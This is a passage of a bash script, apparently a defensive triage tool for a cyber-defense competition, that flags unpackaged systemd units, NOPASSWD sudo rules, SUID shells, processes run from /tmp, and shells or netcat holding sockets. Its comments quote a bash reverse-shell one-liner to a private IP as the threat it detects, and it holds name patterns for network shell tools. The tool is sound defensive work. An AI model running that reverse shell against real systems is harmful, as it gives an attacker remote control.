# generator, and others. Every unit there is unpackaged by definition, and its
# mtime is not evidence of anything: `systemctl daemon-reload` re-runs the
# generators and rewrites the files. On the lab box netplan-ovs-cleanup.service
# was reported as "written 3 seconds ago" immediately after an operator ran a
# daemon-reload that this tool had just told them to run, which is a finding
# the tool manufactured for itself.
#
# The cost of skipping it is real but small: a unit dropped in /run does not
# survive a reboot, so it is not persistence, which is what this check is for -
# and if it is actually doing something it surfaces in the process and socket
# checks instead.
for udir in /etc/systemd/system /usr/local/lib/systemd/system /usr/lib/systemd/system-preset; do
  [ -d "$udir" ] || continue
  for uf in "$udir"/*.service "$udir"/*.timer "$udir"/*.socket "$udir"/*.path; do
    # A symlink here is what `systemctl enable` creates; the real unit it points
    # at is a package file and gets judged on its own.
    [ -f "$uf" ] && [ ! -L "$uf" ] || continue
    own_payload "$uf" && continue
    case "$(basename -- "$uf")" in
      "${CCDC_GUARDIAN_NAME:-node-health}"*|"${CCDC_SENTRY_NAME:-node-observer}"*) continue ;;
    esac
    pkg_owns "$uf" && continue
    newer_than_box "$uf" || continue
    if unit_is_ours "$uf"; then
      unit_ours="$unit_ours $uf"
      continue
    fi
    unit_rogue="$unit_rogue $uf"
  done
done

if [ -n "$unit_rogue" ]; then
  amber "systemd unit(s) no package shipped, written after this box was built   [CARD 4]"
  detail "a unit does not have to contain anything incriminating to be persistence."
  detail "These are the ones nothing on the box accounts for."
  for uf in $unit_rogue; do emit AMBER rogueunit "$uf" "unpackaged systemd unit newer than the box"; done
  fixhdr
  # Timers first. Disabling the .service while its .timer still exists prints
  # "Disabling 'x.service', but its triggering units are still active", which
  # reads like the command failed - an operator hit exactly that and had to
  # work out on their own that the order was wrong, not the command.
  unit_rogue=$(printf '%s\n' $unit_rogue | sed 's|.*|& &|' \
    | awk '{ k = ($1 ~ /\.timer$/) ? 0 : 1; print k, $2 }' \
    | sort -k1,1n -k2,2 | awk '{print $2}')
  for uf in $unit_rogue; do
    ubase=$(basename -- "$uf")
    printf -v quf '%q' "$uf"
    printf -v qub '%q' "$ubase"
    fix ""
    fix "# $ubase - written $(date -d "@$(stat -c '%Y' "$uf" 2>/dev/null)" '+%Y-%m-%d %H:%M' 2>/dev/null)"
    fix "systemctl cat -- $qub                        # read it before you stop it"
    fix "systemctl list-timers --all | grep -F -- ${qub%.*}"
    # The unit is half of it. What the unit RUNS is the other half, and
    # removing the unit while leaving the payload means it comes back with the
    # next unit somebody writes.
    for target in $(awk -F= '/^Exec[A-Za-z]*=/ {print $2}' "$uf" 2>/dev/null \
                    | awk '{print $1}' | sed 's/^[@+!-]*//' | sort -u); do
      case "$target" in
        /*) printf -v qt '%q' "$target"
            # `cat` on an ELF binary dumps control characters into the terminal
            # and can leave it unusable. Ask what it is first.
            if [ -f "$target" ] && head -c2 -- "$target" 2>/dev/null | grep -q '#!'; then
              fix "ls -l -- $qt && cat -- $qt            # what it actually runs"
            else
              fix "ls -l -- $qt && file -- $qt           # what it actually runs"
            fi
            # Naming the payload is not the same as removing it. An operator
            # removed both unit files exactly as instructed and left
            # /usr/local/sbin/sysstat-collect sitting on disk, because nothing
            # here offered to take it - and a payload with no unit is one
            # `systemctl enable` away from being persistence again.
            if ! pkg_owns "$target"; then
              fix "sudo cp -p -- $qt $(printf '%q' "$state_dir")/ && sudo rm -- $qt   # the PAYLOAD, not just the unit"
            else
              fix "#   (that target is package-owned - leave it alone)"
            fi ;;
      esac
    done
    fix "sudo systemctl disable --now -- $qub"
    fix "sudo cp -p -- $quf $(printf '%q' "$state_dir")/ && sudo rm -- $quf"
    fix "sudo systemctl daemon-reload"
  done
  detail "confirm against the packet first: a unit YOU or a teammate wrote today"
  detail "looks exactly like this."
else
  clean "no unpackaged systemd unit is newer than the box"
fi
if [ -n "$unit_ours" ]; then
  for uf in $unit_ours; do
    detail "(also unpackaged and newer than the box, but your config names it:"
    detail " $uf - NOT offered for removal)"
  done
fi

# --- 6. Passwordless sudo -----------------------------------------------------
# `grep -h` suppresses the filename, and that is the whole problem with the way
# this used to print. An operator got
#
#     www-lab ALL=(ALL) NOPASSWD:ALL
#     banneluk ALL=(ALL) NOPASSWD:ALL
#
# and no way to tell that the first is in a file planted twenty minutes ago and
# the second shipped with the image at first boot. Same line, same shape, and
# the answer is entirely in which file each one lives in and when that file
# appeared. -H, not -h.
begin
nopw=$(grep -rIHn '^[^#]*NOPASSWD' /etc/sudoers /etc/sudoers.d 2>/dev/null | grep -v '^\s*$')
if [ -n "$nopw" ]; then
  amber "passwordless sudo is configured - confirm each line is the packet's   [CARD 7]"
  # One finding per FILE, not one that says "sudoers". A subject that is a
  # category rather than a target can never be acted on, and sentry printed it
  # as the identifier - the same defect as the old "see-log" subjects.
  nopw_late=''
  nopw_files=''
  while IFS= read -r l; do
    [ -n "$l" ] || continue
    nfile=${l%%:*}
    rest=${l#*:}
    nline=${rest%%:*}
    ntext=${rest#*:}
    detail "$(printf '%s' "$ntext" | cut -c1-96)"
    nopw_files="$nopw_files $nfile"
    if newer_than_box "$nfile"; then
      detail "   $nfile   line $nline   - written $(date -d "@$(stat -c '%Y' "$nfile" 2>/dev/null)" '+%Y-%m-%d %H:%M' 2>/dev/null), AFTER this box was built"
      nopw_late="$nopw_late $nfile"
    else
      detail "   $nfile   line $nline   - predates this box or is as old as it"
    fi
  done <<EOF
$nopw
EOF
  # RED for a drop-in that postdates the box - that one you have no account
  # for and it can be removed. AMBER for the rest, which need your eyes against
  # the packet.
  for nfile in $(printf '%s\n' $nopw_files | sort -u); do
    if ccdc_list_contains "$nfile" "$nopw_late"; then
      emit RED nopasswd "$nfile" "passwordless sudo in a file written after this box was built"
    else
      emit AMBER nopasswd "$nfile" "passwordless sudo - confirm this line is the packet's"
    fi
  done
  if [ -n "$nopw_late" ]; then
    detail ""
    detail "the file(s) written after the box was built are the ones you have no"
    detail "account for. That is not proof - it is where to look first."
  fi
  fixhdr
  # `sudo cat /etc/sudoers.d/*` does not work and looks like it should. The
  # glob is expanded by YOUR shell, before sudo runs, and your shell cannot
  # read a 0750 root-owned directory - so the literal "/etc/sudoers.d/*" is
  # handed to cat and it reports No such file or directory. The sudo has to
  # cover the expansion, not just the command.
  fix "sudo sh -c 'cat /etc/sudoers.d/*'             # read every line, not just the grep hit"
  fix "sudo ls -lt /etc/sudoers.d/                   # newest first"
  fix "# a line that is not the packet's goes away with the file it is in."
  fix "# ONLY the files that postdate this box are offered here:"
  nopw_offered=0
  for nf in $(printf '%s\n' "$nopw_late" | tr ' ' '\n' | sort -u); do
    [ -n "$nf" ] || continue
    printf -v qnf '%q' "$nf"
    fix "sudo cp -p -- $qnf $(printf '%q' "$state_dir")/ && sudo rm -- $qnf"
    nopw_offered=1
  done
  if [ "$nopw_offered" -eq 0 ]; then
    fix "#   (none - every NOPASSWD file here is as old as the box)"
  fi
  for nf in $(printf '%s\n' "$nopw_files" | tr ' ' '\n' | sort -u); do
    [ -n "$nf" ] || continue
    case " $nopw_late " in *" $nf "*) continue ;; esac
    fix "#   NOT offered: $nf predates the box - deleting it may remove YOUR sudo"
  done
  fix "sudo visudo -c                                # MUST say 'parsed OK' before you walk away"
  fix "# a broken sudoers file locks EVERYONE out of sudo, including you."
  fix "# Keep this shell open until visudo -c passes."
  detail "removing the ACCOUNT instead of the rule is usually wrong here: a line"
  detail "granting NOPASSWD to a service account is an escalation of an account"
  detail "the scored service still needs. Take the rule, keep the account."
else
  clean "no NOPASSWD sudo rules"
fi

# --- 7. SUID interpreters -----------------------------------------------------
# A SUID shell or scripting language is not a configuration choice anyone makes.
# Distinguished from the general SUID list, which is long and mostly legitimate
# and therefore unreadable - which is how a SUID bash hides in it.
begin
# Two ways in, because matching on the NAME alone is not enough.
#
# The name check below looks for a path ENDING in /bash, /python and so on. A
# red team that copies bash to /usr/local/bin/bash-static defeats it
# completely, and renaming the copy is free. Measured on the lab box: a SUID
# root bash sat at /usr/local/bin/bash-static through a full triage pass that
# printed "no SUID shells or interpreters".
#
# So the second check asks a question a rename cannot dodge: does any PACKAGE
# own this file? A distro's SUID binaries (sudo, su, mount, passwd, ping) are
# all packaged. An unpackaged SUID root binary is somewhere between a
# compiled-from-source install and a back door, and on a box you were handed an
# hour ago it is worth looking at either way.
suid_all=$(find / -xdev -perm -4000 -type f 2>/dev/null)
suid=$(printf '%s\n' "$suid_all" \
  | grep -E '/(bash|sh|dash|zsh|ksh|python[0-9.]*|perl|ruby|php|awk|find|vim?|nano|less|more|tar|cp|env|node|pkexec)$')

suid_unpackaged=''
suid_twin=''
twin=''
if ccdc_have dpkg-query || ccdc_have rpm; then
  while IFS= read -r f; do
    [ -n "$f" ] || continue
    # Already reported by name; do not say it twice.
    printf '%s\n' "$suid" | grep -qxF -- "$f" && continue
    own_payload "$f" && continue
    pkg_owns "$f" && continue
    suid_unpackaged="$suid_unpackaged $f"
  done <<EOF
$suid_all
EOF
fi

if [ -n "$suid" ]; then
  red "SUID interpreter(s)/utilities - instant root for any local user   [CARD 5]"
  for f in $suid; do emit RED suid "$f" "SUID interpreter or file utility"; done
  for f in $suid; do
    detail "$(ls -l "$f" 2>/dev/null)"
    printf -v qf '%q' "$f"
    fixhdr
    fix "sudo chmod u-s -- $qf                      # strip SUID; do NOT delete the binary"
  done
elif [ -z "$suid_unpackaged" ]; then
  clean "no SUID shells, interpreters, or unpackaged SUID binaries"
fi

# Where it lives is one signal. What it IS, and when it arrived, are two more,
# and they outrank location.
#
# The previous version of this sorted on location alone: /usr/local and /tmp got
# RED, everything else got an AMBER captioned "usually a packaging quirk;
# confirm once and move on". A SUID root copy of /bin/dash at
# /usr/lib/x86_64-linux-gnu/gvfsd-helper therefore printed under that caption,
# one line above a genuine stock binary, and the operator - correctly reading
# the tool's own advice - did not know which one to care about.
#
# /usr/lib is a good place to hide a SUID binary precisely because
# ssh-keysign genuinely is SUID and genuinely does live there. Location cannot
# separate those. Identity and date can.
suid_dropped=''
suid_odd=''
for f in $suid_unpackaged; do
  if twin=$(identical_to "$f"); then
    suid_dropped="$suid_dropped $f"
    suid_twin="$suid_twin$f|$twin
"
    continue
  fi
  if newer_than_box "$f"; then
    suid_dropped="$suid_dropped $f"
    continue
  fi
  case "$f" in
    /usr/local/*|/opt/*|/home/*|/tmp/*|/var/tmp/*|/dev/shm/*|/srv/*|/root/*)
      suid_dropped="$suid_dropped $f" ;;
    *) suid_odd="$suid_odd $f" ;;
  esac
done

if [ -n "$suid_dropped" ]; then
  red "SUID root binary(s) that no package owns   [CARD 5]"
  detail "a renamed shell defeats a name-based check; ownership does not care"
  detail "what it is called, and neither does a byte comparison."
  for f in $suid_dropped; do emit RED suidunpackaged "$f" "SUID root binary owned by no package"; done
  for f in $suid_dropped; do
    printf '\n'
    detail "$(ls -l "$f" 2>/dev/null)"
    twin=$(printf '%s' "$suid_twin" | awk -F'|' -v p="$f" '$1==p {print $2; exit}')
    if [ -n "$twin" ]; then
      detail "   byte-for-byte IDENTICAL to $twin"
      detail "   that is not a binary that resembles a shell. It is that shell,"
      detail "   SUID root, under a name chosen to belong where it sits."
    fi
    if newer_than_box "$f"; then
      detail "   written $(date -d "@$(stat -c '%Y' "$f" 2>/dev/null)" '+%Y-%m-%d %H:%M' 2>/dev/null) - AFTER this box was built"
    fi
    printf -v qf '%q' "$f"
    fixhdr
    fix "file -- $qf && sha256sum -- $qf          # what IS it?"
    fix "cmp -s -- $qf /bin/dash && echo 'it is dash'   # or bash, or busybox"
    fix "sudo chmod u-s -- $qf                      # strip SUID FIRST - this alone defangs it"
    fix "# only then decide about deleting it. Preserve before you do:"
    fix "sudo cp -p -- $qf /var/tmp/ccdc-evidence/"
  done
fi

if [ -n "$suid_odd" ]; then
  amber "SUID root binary(s) in a system directory that no package owns   [CARD 5]"
  detail "these predate the box and are not copies of a shell, so they are"
  detail "most likely a packaging quirk - but confirm each one once."
  for f in $suid_odd; do
    emit AMBER suidunpackaged "$f" "SUID root binary in a system directory owned by no package"
    detail "$(ls -l "$f" 2>/dev/null)"
  done
  fixhdr
  fix "# confirm each one once. If these agree it is stock, nothing needs doing:"
  for f in $suid_odd; do
    printf -v qf '%q' "$f"
    fix "dpkg -S $qf || dpkg -S $(printf '%q' "${f#/usr}")   # merged-/usr spelling"
    fix "cmp -s -- $qf /bin/dash && echo 'THIS IS DASH - treat as RED'"
  done
fi

# --- 8. Processes running from a world-writable directory ---------------------
begin
tmpproc=$(ls -l /proc/*/exe 2>/dev/null | grep -E '/(tmp|var/tmp|dev/shm)/' | head -10)
if [ -n "$tmpproc" ]; then
  red "process(es) executing from /tmp, /var/tmp or /dev/shm   [CARD 6]"
  # Name the process, not "see-log". A finding whose subject is a literal
  # instruction to go and read something else cannot be acted on, and sentry
  # printed it as the identifier.
  printf '%s\n' "$tmpproc" | while IFS= read -r l; do
    [ -n "$l" ] || continue
    emit RED tmpproc "$(printf '%s' "$l" | sed 's|.*/proc/\([0-9]*\)/exe.*-> |pid\1:|')" \
      "process executing from a world-writable directory"
  done
  while IFS= read -r l; do detail "$(printf '%s' "$l" | cut -c1-110)"; done <<EOF
$tmpproc
EOF
  fixhdr
  fix "# FREEZE first. A killed process takes its memory, its open sockets and"
  fix "# its parent with it, and the parent is how it comes back."
  for tp in $(printf '%s\n' "$tmpproc" | grep -oE '/proc/[0-9]+/' | grep -oE '[0-9]+' | sort -un); do
    fix ""
    fix "sudo kill -STOP $tp"
    fix "sudo cp -- /proc/$tp/exe $(printf '%q' "$state_dir")/exe-$tp   # works even if unlinked"
    fix "sudo tr '\\0' ' ' < /proc/$tp/cmdline; echo"
    fix "sudo ls -l /proc/$tp/cwd /proc/$tp/fd"
    fix "ps -o pid,ppid,user,lstart,cmd -p $tp \$(ps -o ppid= -p $tp)   # WHO STARTED IT"
    fix "sudo kill -9 $tp                           # only after the five above"
  done
else
  clean "no process runs from a world-writable directory"
fi

# Deleted-on-disk executables: the classic "drop it, run it, unlink it" so the
# payload exists only in memory and hunt.sh's file sweeps cannot see it.
begin
deleted=$(ls -l /proc/*/exe 2>/dev/null | grep '(deleted)' | grep -vE '/(systemd|dbus)' | head -5)
if [ -n "$deleted" ]; then
  amber "process(es) whose executable was deleted from disk   [CARD 6]"
  detail "sometimes a mid-upgrade daemon, sometimes a payload that unlinked itself"
  while IFS= read -r l; do detail "$(printf '%s' "$l" | cut -c1-110)"; done <<EOF
$deleted
EOF
  fixhdr
  fix "# /proc/PID/exe still resolves after the file is unlinked, so the binary"
  fix "# is recoverable from memory for exactly as long as the process lives."
  for tp in $(printf '%s\n' "$deleted" | grep -oE '/proc/[0-9]+/' | grep -oE '[0-9]+' | sort -un); do
    fix ""
    fix "sudo cp -- /proc/$tp/exe $(printf '%q' "$state_dir")/exe-$tp   # DO THIS FIRST"
    fix "sudo dpkg -S \$(readlink /proc/$tp/exe | sed 's/ (deleted)//') 2>/dev/null"
    fix "ps -o pid,ppid,user,lstart,cmd -p $tp"
  done
  fix "# a package mid-upgrade looks exactly like this and is harmless. The"
  fix "# question the ps line answers: did apt start it, or did something else?"
else
  clean "no running process has a deleted executable"
fi

# Splunk's own daemons. The packet puts an indexer on one box and forwarders on
# the others, installed under /opt - often from a tarball, so no package owns
# them - listening on ports no scored service uses (8089 management, 8191 KV
# store), and the rules forbid disabling forwarding to the Black Team indexer.
# Reported, they were four AMBER rows on every pass of a box nobody could act
# on. Matched precisely - those daemon names, in a Splunk tree's bin/ - so a
# payload dropped beside them, a deleted binary, or an interpreter Splunk runs
# is still judged on its own.
splunk_trees="${CCDC_SPLUNK_HOME:-} /opt/splunk /opt/splunkforwarder"
splunk_daemon_pid() {
  local exe t
  exe=$(readlink "/proc/$1/exe" 2>/dev/null) || return 1
  case "$exe" in *' (deleted)') return 1 ;; esac
  for t in $splunk_trees; do
    case "$exe" in
      "$t"/bin/splunkd|"$t"/bin/mongod|"$t"/bin/mongod-*) return 0 ;;
    esac
  done
  return 1
}

# --- 9. Listeners the packet does not account for -----------------------------
begin
if ccdc_have ss && [ -n "${CCDC_ALLOWED_TCP_PORTS:-}" ]; then
  unexpected=''
  # Loopback-only listeners are excluded deliberately. The standard this check
  # enforces is "nothing but scored services should show on an nmap scan", and
  # a socket bound to 127.0.0.x or ::1 shows on no scan from anywhere. Leaving
  # them in flagged systemd-resolved's 127.0.0.53:53 on every run, and a check
  # that is wrong on a stock box every time is a check you stop reading.
  splunk_ports=''
  while IFS= read -r port; do
    [ -n "$port" ] || continue
    ccdc_list_contains "$port" "${CCDC_ALLOWED_TCP_PORTS:-}" && continue
    holders=$(ss -tlnpH "sport = :$port" 2>/dev/null | grep -oE 'pid=[0-9]+' | cut -d= -f2 | sort -u)
    all_splunk=1
    for hp in $holders; do splunk_daemon_pid "$hp" || all_splunk=0; done
    if [ -n "$holders" ] && [ "$all_splunk" -eq 1 ]; then
      splunk_ports="$splunk_ports $port"
      continue
    fi
    unexpected="$unexpected $port"
  done <<EOF
$(ss -tlnH 2>/dev/null | awk '$4 !~ /^(127\.|\[::1\]|::1)/ {print $4}' | sed 's/.*://' | sort -un)
EOF
  if [ -n "$unexpected" ]; then
    amber "listening TCP port(s) not in CCDC_ALLOWED_TCP_PORTS:$unexpected   [CARD 8]"
    for p in $unexpected; do emit AMBER port "$p" "listening port not in the allow list"; done
    detail "\"nothing but scored services should show on an nmap scan\""
    for p in $unexpected; do
      detail "$(ss -tlnpH "sport = :$p" 2>/dev/null | head -1 | cut -c1-100)"
    done
    fixhdr
    for p in $unexpected; do
      fix "sudo ss -tlnp 'sport = :$p'                 # what holds port $p"
      fix "sudo ss -tlnpH 'sport = :$p' | grep -oE 'pid=[0-9]+' | cut -d= -f2 | sort -u | xargs -r sudo ps -o pid,user,unit,lstart,cmd -p   # who, which unit, what command"
    done
    fix "# THEN decide, and the order matters:"
    fix "#  - it is a scored service on a port you forgot    -> add it to CCDC_ALLOWED_TCP_PORTS"
    fix "#    then: sudo $SCRIPT_DIR/sentry.sh --config $config --reload-config --apply"
    fix "#    (editing the config alone does not reach the running sentry - packet-to-config.md)"
    fix "#  - it is a service you do not need                -> services.sh --review, not kill"
    fix "#  - nothing accounts for it                        -> CARD 12, freeze before you kill"
    fix "# Do NOT firewall it off as a first move: if it turns out to be scored,"
    fix "# you have taken the service down from the scoring engine's side while"
    fix "# it still looks up from here."
  else
    clean "no unexpected listening TCP ports"
  fi
  [ -z "$splunk_ports" ] || clean "Splunk's own ports, not scored, kept off the network by fw.sh:$splunk_ports"
else
  clean "port check skipped (need ss + CCDC_ALLOWED_TCP_PORTS)"
fi

# --- 9-ii. Listening UDP ports ------------------------------------------------
# UDP gets its own check because the TCP one cannot see it at all, and a UDP
# listener is a normal way to hold a foothold that survives a TCP-only firewall
# review.
#
# CCDC_ALLOWED_UDP_PORTS is empty on most boxes - the packet usually scores TCP
# services - so an allow-list-only test would flag stock Ubuntu's DHCP client and
# mDNS responder on every single pass. A check that is wrong on a clean box is a
# check you stop reading, so the stock set below is allowed implicitly. It is
# deliberately short: these are the ports a default install binds, not a blanket
# "common services" list, because the whole value of this check is that an
# unexplained UDP port stands out.
#
# The ephemeral range is excluded for the same reason, and it is read from the
# kernel rather than guessed. Every outbound UDP client - the resolver, NTP,
# anything that has ever sent a packet - holds an unconnected socket on a random
# high port, and those ports are DIFFERENT on every pass. Reported, they are a
# permanent block of findings that never repeats and never means anything.
#
# That is a real hole and it is covered deliberately somewhere else: check 9-iii
# below looks at every listening socket by OWNER, so a payload that binds UDP
# 45000 is caught there by what is holding it, not by its port number.
begin
stock_udp='68 546 123 323 5353 631 111 67'
ephemeral_low=32768
ephemeral_high=60999
if [ -r /proc/sys/net/ipv4/ip_local_port_range ]; then
  read -r __eph_low __eph_high </proc/sys/net/ipv4/ip_local_port_range 2>/dev/null || true
  case "${__eph_low:-}${__eph_high:-}" in
    ''|*[!0-9]*) : ;;
    *) ephemeral_low=$__eph_low; ephemeral_high=$__eph_high ;;
  esac
fi
if ccdc_have ss; then
  unexpected_udp=''
  while IFS= read -r port; do
    [ -n "$port" ] || continue
    ccdc_list_contains "$port" "${CCDC_ALLOWED_UDP_PORTS:-}" && continue
    ccdc_list_contains "$port" "$stock_udp" && continue
    [ "$port" -ge "$ephemeral_low" ] 2>/dev/null && [ "$port" -le "$ephemeral_high" ] 2>/dev/null && continue
    unexpected_udp="$unexpected_udp $port"
  done <<EOF
$(ss -ulnH 2>/dev/null | awk '$4 !~ /^(127\.|\[::1\]|::1)/ {print $4}' | sed 's/.*://' | sort -un)
EOF
  if [ -n "$unexpected_udp" ]; then
    amber "listening UDP port(s) not accounted for:$unexpected_udp   [CARD 8]"
    for p in $unexpected_udp; do emit AMBER udpport "$p" "listening UDP port not in the allow list"; done
    detail "UDP does not appear in a TCP port review and is easy to forget"
    for p in $unexpected_udp; do
      detail "$(ss -ulnpH "sport = :$p" 2>/dev/null | head -1 | cut -c1-100)"
    done
  else
    clean "no unexpected listening UDP ports"
  fi
else
  clean "UDP port check skipped (need ss)"
fi

# --- 9-iii. What is HOLDING the network sockets -------------------------------
# Every check above this line reads something at rest: a file, an account, a
# unit. All of them are blind to the payload that never touched the disk -
#
#     bash -i >& /dev/tcp/10.0.0.5/443 0>&1
#
# - because there is no file to find, the port is one the firewall must allow,
# and the connection is outbound so no listener appears anywhere. The only place
# it is visible is the socket table, and the finding is not the port. It is WHO
# IS HOLDING IT.
#
# So this does not ask "is this port allowed". It asks whether the process on
# the end of a socket has any business being on the end of a socket. A shell or
# an interpreter holding a connection to the outside is the single highest-
# confidence signal in this file: nothing about administering a web server
# leaves bash attached to a foreign address.
#
# Three separate tells, in descending confidence:
#   1. the owner is a shell/interpreter/netcat        (reverse or bind shell)
#   2. the owner's executable was deleted or lives in /tmp   (dropped payload)
#   3. the owner's executable belongs to no package   (AMBER: compiled implant,
#      but also every from-source install, so it is a prompt and not a verdict)
#
# Root sees every socket's owner. A normal user sees only their own, which is
# partial and still worth having - the first triage of an event is usually run
# before anyone has thought about sudo, and a payload running as the account you
# are logged in on is exactly the case that is visible. What must never happen is
# a partial pass printing the word "clean" as if it were a whole one, so the
# result line below says which of the two runs you just did.
begin
if ! ccdc_have ss; then
  clean "socket owner check skipped (need ss)"
else
  socket_scope='every process'
  [ "$(id -u)" -eq 0 ] || socket_scope="only $(id -un)'s own processes - RE-RUN WITH SUDO for the rest"
  # Ports this box listens on. A TCP session whose LOCAL port is one of these is
  # someone connecting IN; anything else is this box reaching OUT. Getting that
  # backwards would report every visitor to a scored web server as an outbound
  # C2 channel, so it is computed from the live listen table rather than assumed.
  listen_ports=$(ss -tlnH 2>/dev/null | awk '{print $4}' | sed 's/.*://' | sort -un | tr '\n' ' ')

  # Cache the package lookup per executable: a busy box has hundreds of sockets
  # and a handful of distinct binaries behind them.
  # One string, "|path=state|" per entry. The two parallel word lists this
  # replaced were read back with `cut -d' ' -f$i` from a list that began with a
  # space, so every lookup after the first read the entry BEFORE it. A service
  # listening on IPv4 and IPv6 is two sockets, so the second one always hit the
  # cache - measured on the 18.04 replica: dovecot, owned by dovecot-core, was
  # reported as "a binary no package owns" on its [::]:995 socket.
  pkg_cache='|'
  pkg_owned() {
    local exe=$1 state
    case "$pkg_cache" in
      *"|$exe=yes|"*) return 0 ;;
      *"|$exe=no|"*|*"|$exe=unknown|"*) return 1 ;;
    esac
    state=unknown
    # Through lib/provenance.sh, which asks the merged-/usr spelling too. This
    # file sources that library and then had its own copy of the question that
    # did not: asking only the literal path calls /usr/bin/nc.openbsd
    # unpackaged, because dpkg recorded it as /bin/nc.openbsd. All this
    # function adds is the cache.
    if ccdc_have dpkg-query || ccdc_have rpm; then
      pkg_owns "$exe" && state=yes || state=no
    fi
    # A path with a separator or whitespace in it is answered, not cached.
    case "$exe" in
      *'|'*|*=*|*[[:space:]]*) : ;;
      *) pkg_cache="$pkg_cache$exe=$state|" ;;
    esac
    [ "$state" = yes ]
  }

  # Why this process holding this socket is not normal - or nothing, if it is.
  # Prints the reason and returns 0; returns 1 for an ordinary daemon.
  socket_owner_reason() {
    local exe=$1 base
    case "$exe" in
      *' (deleted)') printf 'its executable was deleted from disk'; return 0 ;;
      /tmp/*|/var/tmp/*|/dev/shm/*) printf 'its executable lives in a world-writable directory'; return 0 ;;
    esac
    base=${exe##*/}
    case "$base" in
      sh|bash|dash|zsh|ksh|busybox|python|python[0-9.]*|perl|ruby|php|lua|lua[0-9.]*|\
      tclsh|expect|nc|nc.openbsd|nc.traditional|ncat|netcat|socat|telnet|awk|gawk|mawk)
        printf 'it is %s - an interpreter, not a service' "$base"; return 0 ;;
      # These never open a socket themselves, so one holding a socket was
      # handed it by the shell that started it. Live run: the C2 shell was
      # killed, its `sleep 3600` child kept the connection open for an hour,
      # and nothing reported it - sleep is packaged and is not a shell.
      sleep|cat|tail|head|tee|dd|yes|base64|xxd|od|sort|timeout|nohup|mkfifo|stdbuf)
        printf 'it is %s, which never opens a connection itself - it inherited this one from a shell' "$base"; return 0 ;;
    esac
    return 1
  }

  # The systemd unit that owns a pid, or nothing. A .scope is a session, not a
  # unit someone installed, so it does not count.
  pid_unit_name() {
    [ -r "/proc/$1/cgroup" ] || return 1
    tr '/' '\n' <"/proc/$1/cgroup" 2>/dev/null \
      | grep -E '\.(service|socket)$' | tail -1
  }

  # Buffer the three groups instead of printing as the loop finds them. A busy
  # box interleaves them - RED, then an AMBER, then another RED - and the
  # remediation block for one finding then sits underneath a different finding's
  # heading. On a screen you are reading in a hurry that is not a cosmetic
  # problem: the "run this" commands under a heading have to belong to it.
  #
  # detail() and fix() write fixed indents, so the buffers reproduce them rather
  # than reformatting: the printed output is identical, only the order changes.
  D='         '
  F='           '
  FIXHDR="${D}---- run this ----------------------------------------"
  net_red_buf=''
  net_amber_buf=''
  net_unpkg_buf=''
  seen_sockets=''
  seen_unpackaged=''
  while read -r netid state _ _ local_addr peer rest; do
    [ -n "${rest:-}" ] || continue
    # CLOSE-WAIT and SYN-SENT too. Found live: the planted C2 shell outlived its
    # server and held a CLOSE-WAIT socket for an hour, invisible here, because
    # only ESTAB counted. A shell still holding a dead connection, or retrying
    # one (SYN-SENT), is the same live implant.
    case "$state" in ESTAB|LISTEN|UNCONN|CLOSE-WAIT|SYN-SENT) ;; *) continue ;; esac
    # A socket that only ever talks to this machine is not an exfil path and not
    # reachable from a scan. Excluding it is the same call the TCP port check
    # above documents, for the same reason.
    case "$local_addr" in 127.*|'[::1]'*|::1*) continue ;; esac
    case "$peer" in 127.*|'[::1]'*|::1*) continue ;; esac
    [ "$netid" = udp ] && [ "$state" = ESTAB ] && case "$peer" in *:67|*:68) continue ;; esac

    # EVERY owner of the socket, not just the first one ss prints.
    #
    # A file descriptor is inherited by children, so one socket routinely has
    # several owners, and ss lists them in an order nobody controls. The
    # canonical reverse shell
    #
    #     bash -i >& /dev/tcp/10.0.0.5/443 0>&1
    #
    # spawns a child for every command the attacker types, and while that child
    # runs, ss prints it alongside - often first:
    #
    #     users:(("sleep",pid=1306152,fd=3),("bash",pid=1306150,fd=3))
    #
    # Reading only the first PID inspected `sleep`, found an ordinary packaged
    # binary, and reported nothing. The drill on the lab VM caught this: the
    # connection was established, the bash process was alive, and triage said
    # the box was clean.
    #
    # So: look at all of them, and report the most incriminating. A shell hiding
    # behind its own child is the normal case, not the edge case.
    pids=$(printf '%s' "$rest" | grep -oE 'pid=[0-9]+' | cut -d= -f2 | sort -un)
    [ -n "$pids" ] || continue

    pid=''; exe=''; reason=''
    fallback_pid=''; fallback_exe=''
    for candidate_pid in $pids; do
      [ "$candidate_pid" = "$$" ] && continue
      candidate_exe=$(readlink "/proc/$candidate_pid/exe" 2>/dev/null) || continue
      [ -n "$candidate_exe" ] || continue
      # Our own tooling legitimately runs interpreters, and the guardian chain
      # holds sockets when it probes a scored service. An unclearable RED
      # teaches you to ignore RED.
      own_payload "${candidate_exe% (deleted)}" && continue
      # Keep the first usable owner in case none of them is suspicious: the
      # unpackaged-binary check below still needs something to report on.
      if [ -z "$fallback_pid" ]; then
        fallback_pid=$candidate_pid
        fallback_exe=$candidate_exe
      fi
      if candidate_reason=$(socket_owner_reason "$candidate_exe"); then
        pid=$candidate_pid
        exe=$candidate_exe
        reason=$candidate_reason
        break
      fi
    done
    if [ -z "$pid" ]; then
      [ -n "$fallback_pid" ] || continue
      pid=$fallback_pid
      exe=$fallback_exe
    fi

    local_port=${local_addr##*:}
    peer_port=${peer##*:}
    direction=outbound
    if [ "$state" = LISTEN ] || [ "$state" = UNCONN ]; then
      direction=listening
    elif ccdc_list_contains "$local_port" "$listen_ports"; then
      direction=inbound
    fi

    if [ -n "$reason" ]; then
      # A python or node web service legitimately listens and legitimately
      # serves inbound sessions. What is never ordinary is that same interpreter
      # reaching OUT, or holding a port nobody put in the packet.
      severity=RED
      if [ "$direction" != outbound ] \
        && ccdc_list_contains "$local_port" "${CCDC_ALLOWED_TCP_PORTS:-} ${CCDC_ALLOWED_UDP_PORTS:-}"; then
        severity=AMBER
      fi
      # Keyed on the PID, not the socket. A finding about a live process is
      # about THAT process: three sockets on one pid are one thing to do, and
      # keying on the socket printed the same row three times.
      key="$pid|$direction"
      case " $seen_sockets " in *" $key "*) continue ;; esac
      seen_sockets="$seen_sockets $key"

      # The subject carries the pid for the same reason tmpproc's does. With a
      # bare executable path as the subject, remediation has to guess which of
      # the processes running that binary was meant - and on this box the first
      # /usr/bin/python3.12 it finds is the scored web server. Measured on the
      # lab VM: three netproc findings, all naming /usr/bin/nc.openbsd, all
      # resolving to one arbitrary pid; and two netprocsvc findings naming
      # /usr/bin/python3.12, both resolving to scored-web, which is protected,
      # so neither could ever be acted on.
      if [ "$severity" = RED ]; then
        # An outbound connection, or a port the packet does not account for.
        # This fires even when the process belongs to a scored unit, because a
        # scored service reaching out is exactly what a compromised scored
